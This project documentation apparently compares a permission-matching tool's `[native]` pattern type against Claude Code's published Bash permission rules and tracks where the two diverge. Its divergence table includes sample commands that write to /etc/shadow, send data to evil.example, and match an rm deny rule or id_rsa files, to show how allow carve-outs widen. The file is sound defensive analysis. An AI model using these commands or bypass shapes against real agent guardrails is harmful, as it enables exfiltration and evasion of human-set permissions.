# What `[native]` is supposed to mirror

**Last verified against Claude Code's published documentation: 2026-08-13, re-checked 2026-08-20 (no change to the quotes below).**
Source: <https://code.claude.com/docs/en/permissions> (section "Bash").

toolguard's `[native]` pattern type is defined **by reference to an external, evolving specification** — Claude Code's own builtin permission rules. That means any claim that `[native]` matches native is true only as of a date, and this file carries that date. Everywhere else in our documentation that discusses `[native]` should link here rather than restate the semantics, so there is one place to re-verify.

**Re-verify when Claude Code updates.** The behaviour below is relatively recent: wildcards were once accepted only as a trailing wildcard, and the position-independent form plus the word-boundary rule arrived later. A statement that we match native is a universally quantified claim about a moving target.

---

## Quoted verbatim from Claude Code's documentation

> Bash permission rules support wildcard matching with `*`. Wildcards can appear at any position in the command, including at the beginning, middle, or end:
>
> * `Bash(npm run build)` matches the exact Bash command `npm run build`
> * `Bash(npm run test *)` matches Bash commands starting with `npm run test`
> * `Bash(npm *)` matches any command starting with `npm `
> * `Bash(* install)` matches any command ending with ` install`
> * `Bash(git * main)` matches commands like `git checkout main` and `git log --oneline main`

> A single `*` matches any sequence of characters including spaces, so one wildcard can span multiple arguments. `Bash(git *)` matches `git log --oneline --all`, and `Bash(git * main)` matches `git push origin main` as well as `git merge main`.

> When `*` appears at the end with a space before it (like `Bash(ls *)`), it enforces a word boundary, requiring the prefix to be followed by a space or end-of-string. For example, `Bash(ls *)` matches `ls -la` but not `lsof`. In contrast, `Bash(ls*)` without a space matches both `ls -la` and `lsof` because there's no word boundary constraint.

On the `:*` form, from the same page:

> The `:*` suffix is an equivalent way to write a trailing wildcard, so `Bash(ls:*)` matches the same commands as `Bash(ls *)`.

> The `:*` form is only recognized at the end of a pattern. In a pattern like `Bash(git:* push)`, the colon is treated as a literal character and won't match git commands.

And on the bare form:

> `Bash(*)` is equivalent to `Bash` and matches all Bash commands.

On a leading environment-variable assignment, from the "Wrappers" subsection of the same page (this quote verified 2026-08-20, later than the header date, which covers the quotes above it):

> Claude Code also strips a leading assignment of certain known-safe environment variables, so `Bash(npm test *)` matches `NODE_ENV=test npm test`. An allow rule won't match past an assignment of any other variable. A deny or ask rule matches past any leading assignment, so `Bash(rm *)` in deny still matches `FOO=bar rm -rf tmp/`.

---

**toolguard's own behaviour on a bare `:*`/`:**` (no command before it, e.g. `Bash(:*)`).**
Not a native-referenced claim -- Claude Code's docs make none about this shape -- but recorded
here as the one place `:*` semantics are documented. `match_command` treats it as matching an
empty command string, or one starting with a space, rather than raising (verified by
execution: `match_command("", [":*"])` and `match_command(" ls", [":*"])` are both `(True,
":*")`; `match_command("ls", [":*"])` is `(False, None)`). This is a silent fail-open on those
two input shapes, not "matches nothing." It is inert in practice: the PEG command extractor
strips leading whitespace and rejects empty leaves before any command reaches `match_command`,
so no real Bash invocation triggers it -- verified end-to-end via `toolguard.testing.sandbox`,
where an empty or blank leaf is denied upstream ("No valid commands found in command line") and
a leading-space leaf reaches the matcher already stripped.

## Known divergences between toolguard and the above

Recorded here because a reader comparing the two needs them in one place. Each is filed as a proposed ticket with a failing test.

| # | native says | toolguard does |
|---|---|---|
| 17 | `Bash(* install)` matches any command **ending with** ` install` | `[native]*id_rsa` does **not** match `cat id_rsa.pub id_rsa`. The matcher takes the **first** occurrence of the final segment and never backtracks, so the end-anchor check tests the wrong occurrence |
| 18 | `Bash(ls *)` enforces a **word boundary** — matches `ls -la`, not `lsof` | **resolved for the `:*` form** — the boundary is enforced on the whole prefix, so `git log:*` no longer matches `git logfoo`. A trailing `*` still crosses spaces, so `Bash(rm FILE:*)` matches `rm FILE /etc/passwd`, exactly as native does. **A hand-written trailing ` *` pattern still diverges, verified by execution**: a DEFAULT body written as `ls *` (space, no colon) never reaches the boundary-checked branch at all — it is a whole-string `fnmatch` — so `fnmatch('ls', 'ls *')` requires a literal trailing space and does not match bare `ls` (`ls -la` → `True`, `lsof` → `False`, `ls` → `False`), unlike native's stated end-of-string admission. `:*` and a hand-written trailing ` *` are therefore not fully equivalent in toolguard today, only the `:*` form is boundary-checked |
| 18 | `:*` is recognised **only at the end**; `Bash(git:* push)` treats the colon literally | **resolved** -- `match_command` now enters its boundary-checked branch only when a DEFAULT pattern ends in `:*`/`:**`; any other `:` (mid-pattern, or inside a URL like `curl http://ex.com/*`) falls through to a plain `fnmatch`, which treats it as a literal character |
| 19 | Explicit args after a `:` that is not the pattern's trailing `:*` are matched literally, as ordinary text | **bidirectional, not a narrowing** — restricting `:*` recognition to the pattern's literal end (row 18) affects two shapes oppositely. Where a DEFAULT pattern used `:` as an ad-hoc argument separator (e.g. `git commit:-m *`), the old first-colon split is gone: the pattern is now a whole-string `fnmatch`, so it no longer matches `git commit -m x` — **narrowing** a deny written this way (`deny Bash(git push:--force *)` no longer blocks `git push --force origin`) and shrinking an allow written this way. Where a pattern's *own prefix* contains a `:` before its trailing `:*` (e.g. `Bash(curl http://localhost:*)`), the old first-colon split made it match almost nothing; it is now an ordinary boundary-checked prefix and **widens** — verified by execution: `curl http://localhost`, `curl http://localhost -o /etc/shadow` and `curl http://localhost http://evil.example/steal` all went `False` → `True`. This reached `hard_deny`: `configuration.md` published the paired shape `deny = ["Bash(curl:*)"]` / `allow = ["Bash(curl http://localhost:*)"]`, which went from an inert carve-out to one that also exempts a second, unrelated URL argument — a trailing `*` spans arguments the same way in DEFAULT and native alike (the single-`*`-spans-spaces quote above). `agent-guides.md` published only the `allow` half, against a `[hard_deny] deny` list with no `curl` entry, so its example carve-out was inert against that deny list both before and after the colon-recognition change described here (a separate, pre-existing defect -- not this row's finding -- since fixed by adding a matching `curl:*` deny). Both directions are native-faithful. **The actual fix was to stop using `[hard_deny]` for this rule**: `hard_deny` means no exceptions, and a curl carve-out is exactly a rule that needs one. Three successive attempts at a safe-and-usable `[hard_deny]` carve-out (an anchored regex too narrow to be usable, a claim that no pattern works at all, a bounded-flag-set regex still defeated by common flag spellings like `--silent`/`-fsS`/a quoted URL) confirmed this is a property of the mechanism, not of any one pattern. Both recipes now put the curl deny at the ordinary level, where a more-specific `allow` can legitimately override it — see [agent-guides.md](agent-guides.md#recipe-deny-a-command-with-a-legitimate-exception) and [configuration.md](configuration.md#overriding-a-deny-at-a-more-specific-level). A scan of every reachable rule on this machine found 2 real non-trailing-colon rules, neither a deny |

Leading `VAR=value` assignments are **engine-wide rather than `[native]`-specific**, so they are documented with the matching engine instead of in the table above. Per the quote above, the two policies have the same shape -- restricting rules match past the prefix, granting rules only for known-safe names -- and differ over the list: native's is Claude Code's own and its members are not named in that documentation, while toolguard's is `assignments_looked_past_when_granting` and starts empty. See [Leading environment assignments](permission-patterns.md#leading-environment-assignments). It is mentioned here because a reader comparing toolguard against the quoted documentation will otherwise not find it.

---

## What this file is not

It is not a specification of toolguard's own DEFAULT, GLOB or REGEX pattern types — those are toolguard's own and are documented in [permission-patterns.md](permission-patterns.md). It covers only `[native]`, and only because `[native]` promises to imitate something we do not control.
